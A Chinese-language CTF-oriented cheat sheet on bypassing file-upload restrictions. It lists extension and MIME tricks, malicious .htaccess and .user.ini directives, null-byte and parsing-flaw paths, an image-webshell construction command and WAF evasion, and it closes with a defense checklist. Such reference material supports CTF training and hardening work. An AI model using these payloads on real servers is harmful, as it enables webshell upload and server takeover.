# 文件上传漏洞速查（CTF 向）

## 1. 客户端检测绕过

- 前端 JS 校验：浏览器禁 JS / Burp 改包 / 直接构造 POST。
- MIME 校验（Content-Type）：改为 `image/jpeg`。

## 2. 服务端黑名单绕过

| 黑名单 | 绕过 |
|---|---|
| .php | php3/php5/phtml/pht/phps(需配置)/.phtm |
| 大小写 | .PhP / .PHP（Windows 不区分大小写） |
| 尾部空格/点 | `shell.php ` `shell.php.` (Windows 去尾点) |
| 流包装 | `shell.php:.jpg`（NTFS ADS）→ `>> shell.php:.jpg` 写入内容 |
| ::$DATA | `shell.php::$DATA` |
| 双写 | `shell.pphphp`（str_replace 一次替换后还原） |
| htaccess | 上传 `.htaccess`：`AddType application/x-httpd-php .jpg` 或 `<FilesMatch "jpg"> SetHandler application/x-httpd-php </FilesMatch>` |
| user.ini | 上传 `.user.ini`：`auto_prepend_file=shell.jpg`（当前目录及子目录所有 php 自动包含） |

## 3. 服务端白名单绕过

- `%00` 截断（PHP<5.3.4，magic_quotes_gpc=Off）：`shell.php%00.jpg`（路径截断）。
- 0x00 二进制截断（POST multipart 里改二进制）。
- 竞态条件（条件竞争）：先上传再删除的服务器逻辑——并发重放上传包 + 访问包直到成功。
- 二次渲染绕过（imagecreatefromjpeg）：在渲染后仍保留的数据块插入 payload（GIF 找相同数据块、
  JPG 在渲染不影响的数据段、PNG 在 IDAT 分块间）——用脚本对比渲染前后保留区。
- 解析漏洞配合：
  - IIS 6：`shell.asp;1.jpg`、`/x.asp/1.jpg`（目录解析）
  - IIS 7 / Nginx：`/1.jpg/.php`（cgi.fix_pathinfo=1 + fastcgi 传递）
  - Nginx `<8.03` 空字节：`/1.jpg%00.php`
  - Apache：`shell.php.xxx`（从右往左解析不认识的扩展名）

## 4. 图片马（配合解析/包含）

```
copy normal.jpg /b + shell.php /b webshell.jpg
GIF 头：GIF89a + <?php ... ?>
PNG：在文件头后插入 PHP 代码（PNG 校验 CRC 时需脚本重建）
JPG：在 FF D9 之后附加；或用脚本在量化表等位置插入
```
- 触发方式：`include` 包含、`.user.ini`/`.htaccess`、解析漏洞、文件包含漏洞配合。

## 5. 检测内容与 WAF 绕过

- getimagesize / exif_imagetype → 文件头伪造（GIF89a 等）。
- `<?` 过滤：`<script language="php">`（PHP<7）。
- 内容关键词过滤：短标签 `<?=`、PHP 拆分（`<?php` 断行/注释拼接需配合多次包含）。
- WAF 数据边界：multipart 中改 `Content-Disposition` 大小写、增删引号、超长边界填充垃圾字节。

## 6. 上传文件校验函数与风险

```php
move_uploaded_file($_FILES['f']['tmp_name'], $dst);   // $dst 可控即绕过点
getimagesize()                                        // 只看文件头
exif_imagetype()                                      // 同上
finfo_file($finfo, $tmp)                              // MIME 嗅探
```

## 7. 防御清单

- 白名单扩展名 + 重命名（随机名 + 固定白名单后缀）+ 单独存储域 + 不给执行权限。
- 文件头校验 + 二次渲染 + 内容审计；上传目录禁执行（nginx location / Apache php_flag engine off）。
- 最小化：OSS/对象存储分离、CDN 回源隔离、按 URL 签名访问。
